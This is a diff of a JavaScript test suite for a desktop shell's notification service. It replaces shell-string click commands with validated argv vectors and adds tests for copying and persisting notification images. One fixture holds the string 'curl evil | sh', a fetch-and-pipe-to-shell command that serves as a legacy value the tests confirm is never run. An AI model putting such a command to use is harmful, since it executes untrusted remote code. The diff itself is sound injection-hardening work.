@@ -49,6 +49,38 @@ assert(!notifications.shouldBypassDnd({ appName: 'Slack', urgency: 2 }, 2), 'cri
 assert(!notifications.shouldBypassDnd({ appName: 'omarchy-menu-keybindings', urgency: 1 }, 2), 'omarchy command app names do not bypass DND')
 assert(!notifications.isEphemeralApp('omarchy-menu-keybindings'), 'notifications treat omarchy command app names as normal apps')
 
+// The click action's argv form: parsed from the persisted omarchy-exec-argv
+// JSON only when it is a non-empty array of strings whose program is present
+// and not a leading-dash option. Everything else fails closed so a malformed or
+// hostile hint can never fall through to a shell.
+assertDeepEqual(
+  notifications.parseExecArgv('["mpv","--","/home/me/a b.mp4"]'),
+  ['mpv', '--', '/home/me/a b.mp4'],
+  'notifications parse a valid exec argv vector'
+)
+assertEqual(notifications.parseExecArgv(''), null, 'notifications reject an empty exec argv hint')
+assertEqual(notifications.parseExecArgv('not json'), null, 'notifications reject a non-JSON exec argv hint')
+assertEqual(notifications.parseExecArgv('"mpv"'), null, 'notifications reject an exec argv hint that is not an array')
+assertEqual(notifications.parseExecArgv('[]'), null, 'notifications reject an empty exec argv array')
+assertEqual(notifications.parseExecArgv('["mpv",5]'), null, 'notifications reject a non-string element in the exec argv')
+assertEqual(notifications.parseExecArgv('["--include=x","y"]'), null, 'notifications reject a leading-dash program in the exec argv')
+assertEqual(notifications.parseExecArgv('["",""]'), null, 'notifications reject an empty program in the exec argv')
+
+// The argv vector rides on the snapshot as the raw JSON string, so the model's
+// value comparison stays a plain string compare and the file round-trip is
+// lossless.
+const execSnapshot = notifications.snapshotOf({
+  id: 3,
+  appName: 'omarchy-action',
+  summary: 'Download complete',
+  hints: { 'omarchy-exec-argv': '["mpv","--","/tmp/clip.mp4"]' }
+}, 1)
+assertEqual(
+  execSnapshot.execArgv,
+  '["mpv","--","/tmp/clip.mp4"]',
+  'notifications carry the exec argv hint onto the snapshot'
+)
+
 assertDeepEqual(
   notifications.popupPlacement('top', 32, 6),
   {
@@ -263,6 +295,54 @@ assertEqual(
   'notifications preserve popup expire timeouts unlike history rows'
 )
 
+// Persisted entries must not reference images another process owns: Chromium
+// web apps (WhatsApp avatars included) delete their scoped /tmp files when
+// the notification closes, and image:// URLs die with the live object.
+assertEqual(
+  notifications.localImageFile('file:///tmp/scoped_dir/logo%20a.png'),
+  '/tmp/scoped_dir/logo a.png',
+  'notifications resolve file URLs to copyable paths'
+)
+assertEqual(notifications.localImageFile('/tmp/avatar.png'), '/tmp/avatar.png', 'notifications treat absolute paths as copyable')
+assertEqual(notifications.localImageFile('mail'), '', 'notifications leave themed icon names uncopied')
+assertEqual(notifications.localImageFile('image://notifs/1'), '', 'notifications cannot copy in-process image URLs')
+
+const persistable = notifications.persistablePopup(
+  { id: 9, originalId: 9, timestamp: 2000, appIcon: 'file:///tmp/scoped/logo.png', image: 'image://notifs/9', summary: 'Hi' },
+  '/state/images/'
+)
+assertDeepEqual(
+  persistable.copies,
+  [{ from: '/tmp/scoped/logo.png', to: '/state/images/2000-9-appIcon' }],
+  'notifications copy file-backed images into the state dir when persisting'
+)
+assertEqual(
+  persistable.entry.appIcon,
+  'file:///state/images/2000-9-appIcon',
+  'notifications persist the image copy instead of the sender-owned original'
+)
+assertEqual(persistable.entry.image, '', 'notifications drop dead in-process image URLs from persisted entries')
+assertEqual(persistable.entry.summary, 'Hi', 'notifications leave the rest of the persisted entry untouched')
+
+const repersisted = notifications.persistablePopup(persistable.entry, '/state/images/')
+assertDeepEqual(repersisted.copies, [], 'notifications do not re-copy an entry already pointing at its copies')
+assertEqual(
+  repersisted.entry.appIcon,
+  'file:///state/images/2000-9-appIcon',
+  'notifications keep a restored entry pointing at its existing copy'
+)
+
+assertEqual(
+  notifications.persistablePopup({ id: 9, originalId: 9, timestamp: 2000, appIcon: 'mail', image: '' }, '/state/images/').copies.length,
+  0,
+  'notifications leave themed icons alone when persisting'
+)
+assertEqual(
+  notifications.imageStem({ originalId: 9, timestamp: 2000 }) + '.json',
+  notifications.popupFileName({ originalId: 9, timestamp: 2000 }),
+  'notifications name image copies by the stem of the entry file they belong to'
+)
+
 const popupFiles = notifications.parsePopupFiles(
   [
     notifications.serializePopup({ id: 1, originalId: 1, summary: 'old-generation', urgency: 2, timestamp: 100 }, 1),
@@ -305,37 +385,45 @@ assertEqual(
   'notifications omit the deadline field until a restore sets it'
 )
 
-// A click action carried as a command is the only kind that survives a shell
+// The click action (an argv vector) is the only kind that survives a shell
 // restart: a libnotify action leaves its sender waiting on an id from a server
 // generation that no longer exists.
 assertEqual(
-  notifications.snapshotOf({ id: 3, hints: { 'omarchy-exec': 'omarchy-menu-keybindings' } }, 1).exec,
-  'omarchy-menu-keybindings',
-  'notifications capture the click command from the exec hint'
-)
-assertEqual(
-  notifications.snapshotOf({ id: 3, hints: { 'omarchy-glyph': '!' } }, 1).exec,
+  notifications.snapshotOf({ id: 3, hints: { 'omarchy-glyph': '!' } }, 1).execArgv,
   '',
-  'notifications leave the click command empty without an exec hint'
+  'notifications leave the click command empty without an exec argv hint'
 )
 assertEqual(
   notifications.popupEntry(
-    JSON.parse(notifications.serializePopup({ id: 1, originalId: 1, timestamp: 5, exec: "mpv '/tmp/a b.mp4'" }, 1)),
+    JSON.parse(notifications.serializePopup({ id: 1, originalId: 1, timestamp: 5, execArgv: '["mpv","--","/tmp/a b.mp4"]' }, 1)),
     1
-  ).exec,
-  "mpv '/tmp/a b.mp4'",
-  'notifications round-trip the click command through popup files'
+  ).execArgv,
+  '["mpv","--","/tmp/a b.mp4"]',
+  'notifications round-trip the click argv through popup files'
 )
 assertEqual(
-  notifications.popupEntry({ id: 1, originalId: 1, timestamp: 5 }, 1).exec,
+  notifications.popupEntry({ id: 1, originalId: 1, timestamp: 5 }, 1).execArgv,
   '',
   'notifications restore an empty click command for popups without one'
 )
 assertEqual(
-  notifications.historyEntry({ id: 1, exec: 'xdg-open /tmp/received' }, 1).exec,
-  'xdg-open /tmp/received',
-  'notifications keep the click command on history rows'
+  notifications.historyEntry({ id: 1, execArgv: '["xdg-open","/tmp/received"]' }, 1).execArgv,
+  '["xdg-open","/tmp/received"]',
+  'notifications keep the click argv on history rows'
 )
+
+// Upgrade fail-closed: a popup persisted by a pre-upgrade shell carried its
+// click action as an `exec` shell string. After the update-triggered shell
+// restart the new shell only honors execArgv, so a restored legacy popup keeps
+// displaying but its click is inert — deliberately, because splitting the old
+// shell string back into a command is exactly the injection being removed.
+const legacyRestored = notifications.parsePopupFiles(
+  JSON.stringify({ id: 7, originalId: 7, timestamp: 9, summary: 'Legacy toast', exec: 'curl evil | sh' }),
+  1
+)[0]
+assertEqual(legacyRestored.execArgv || '', '', 'a restored legacy exec shell string is not carried into execArgv')
+assert(!('exec' in legacyRestored), 'a restored legacy popup drops the old exec field')
+assertEqual(notifications.parseExecArgv(legacyRestored.execArgv || ''), null, 'a restored legacy popup has no runnable click action')
 
 const serviceQml = fs.readFileSync(path.join(root, 'shell/plugins/notifications/Service.qml'), 'utf8')
 assert(
@@ -363,12 +451,48 @@ assert(
   'notifications service archives by moving the popup file into the history dir'
 )
 assert(
-  /head -n \\"-\$2\\"/.test(serviceQml),
+  /head -n \\"-\$limit\\"/.test(serviceQml),
   'notifications service trims history to the newest entries in the same job'
 )
 assert(
-  /if \(!isEphemeral\(notification\)\) writeHistoryFile\(snapshot\)/.test(serviceQml),
+  /\\"\$imgs\/\$\{stale%\.json\}\\"-\*/.test(serviceQml),
+  'notifications service drops a trimmed history entry\'s image copies with it'
+)
+assert(
+  /readonly property string imagesDir: popupStateDir \+ "images\/"/.test(serviceQml),
+  'notifications service keeps image copies beside the popup and history files'
+)
+assert(
+  /copyImagesScript \+\n\s*"printf/.test(serviceQml),
+  'notifications service copies images before writing the JSON that references them'
+)
+assert(
+  /timeout 5 head -c 5242881 -- \\"\$1\\" > \\"\$2\.tmp\\"[\s\S]{0,120}?mv -f -- \\"\$2\.tmp\\" \\"\$2\\"/.test(serviceQml),
+  'notifications service bounds image copies through a validated temp file'
+)
+assert(
+  /rm -f \\"\$1\/\$2\.json\\" \\"\$3\/\$2\\"-\*/.test(serviceQml),
+  'notifications service deletes a superseded popup\'s image copies with its file'
+)
+assert(
+  /if \(!isEphemeral\(notification\)\) \{\s*\n\s*writeSilenced\(notification, snapshot\)/.test(serviceQml),
   'notifications service records DND-silenced notifications straight into history'
+)
+assert(
+  /function releaseSilenced\(notification, originalId\)[\s\S]{0,300}?notification\.tracked = false/.test(serviceQml),
+  'notifications service holds a silenced notification until its history write has run'
+)
+assert(
+  /if \(updated && NotificationLogic\.popupRowChanged\(written, updated\)\) \{\s*\n\s*service\.writeSilenced\(notification, updated\)/.test(serviceQml),
+  'notifications service re-persists a silenced notification updated while its write was queued'
+)
+assert(
+  /rows\.push\(NotificationLogic\.persistablePopup\(\{[\s\S]{0,400}?\}, imagesDir\)\.entry\)/.test(serviceQml),
+  'notifications service replays carried-over toasts from their persisted image copies'
+)
+assert(
+  /function sweepOrphanImages\(\)[\s\S]{0,400}?\|\| rm -f \\"\$img\\"/.test(serviceQml),
+  'notifications service sweeps image copies whose JSON never landed'
 )
 assert(
   /service\.replayCarryOver = liveRowsForReplay\(\)/.test(serviceQml),
@@ -443,8 +567,8 @@ assert(
   'notifications service delimits every popup file during restore'
 )
 assert(
-  /var command = entry \? String\(entry\.exec \|\| ""\) : ""[\s\S]{0,300}?Util\.execDetached\(command\)/.test(serviceQml),
-  'notifications service runs the popup click command itself instead of a libnotify action'
+  /parseExecArgv\(entry \? entry\.execArgv : ""\)[\s\S]{0,200}?Util\.execArgv\(argv\)/.test(serviceQml),
+  'notifications service runs the popup click argv itself instead of a libnotify action'
 )
 assert(
   /function clear\(\): string \{\s*service\.clearHistory\(\)/.test(serviceQml),
